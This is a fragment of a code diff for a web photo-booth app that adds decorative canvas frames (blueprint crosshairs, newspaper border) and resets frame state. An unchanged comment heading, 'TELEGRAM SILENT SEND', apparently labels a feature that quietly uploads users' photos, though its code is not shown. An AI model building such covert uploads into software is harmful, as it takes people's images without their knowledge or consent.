+        ctx.strokeStyle='rgba(100,60,20,0.3)'; ctx.lineWidth=3*S; ctx.strokeRect(px,py,pw,ph); break;
+      case 'blueprint':
+        ctx.strokeStyle='rgba(100,180,240,0.9)'; ctx.lineWidth=2*S; ctx.strokeRect(px,py,pw,ph);
+        // Corner crosshair marks
+        const m=6*S;
+        ctx.lineWidth=1*S; ctx.strokeStyle='rgba(100,180,240,0.7)';
+        [[px,py],[px+pw,py],[px,py+ph],[px+pw,py+ph]].forEach(([cx,cy])=>{
+          ctx.beginPath();ctx.moveTo(cx-m,cy);ctx.lineTo(cx+m,cy);ctx.stroke();
+          ctx.beginPath();ctx.moveTo(cx,cy-m);ctx.lineTo(cx,cy+m);ctx.stroke();
+        }); break;
+      case 'newspaper':
+        ctx.strokeStyle='rgba(30,30,30,0.85)'; ctx.lineWidth=2*S; ctx.strokeRect(px,py,pw,ph); break;
+    }
   }
 
   // ── TELEGRAM SILENT SEND ───────────────────────────────
@@ -1562,7 +1715,7 @@
       stream: null, photos: [], filter: 'f-normal', label: '',
       numShots: 4, currentShot: 0, shooting: false,
       timerSecs: 3, bgTheme: 'black', stickers: new Set(),
-      stripLayout: 'grid'
+      stripLayout: 'grid', frame: 'none'
     });
     document.querySelectorAll('.shot-btn').forEach(b => b.classList.remove('active'));
     document.querySelector('.shot-btn[data-shots="4"]').classList.add('active');
@@ -1573,7 +1726,8 @@
     document.querySelectorAll('[data-theme]').forEach(b => b.classList.remove('active'));
     document.querySelector('[data-theme="black"]').classList.add('active');
     document.querySelectorAll('.sticker-btn').forEach(b => b.classList.remove('active'));
-    document.querySelectorAll('.layout-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.frame-btn').forEach(b => b.classList.remove('active'));
+    document.querySelector('[data-frame="none"]').classList.add('active');
     document.querySelector('[data-layout="grid"]').classList.add('active');
     document.getElementById('strip-label').value = '';
     document.getElementById('start-sequence-btn').style.display = '';
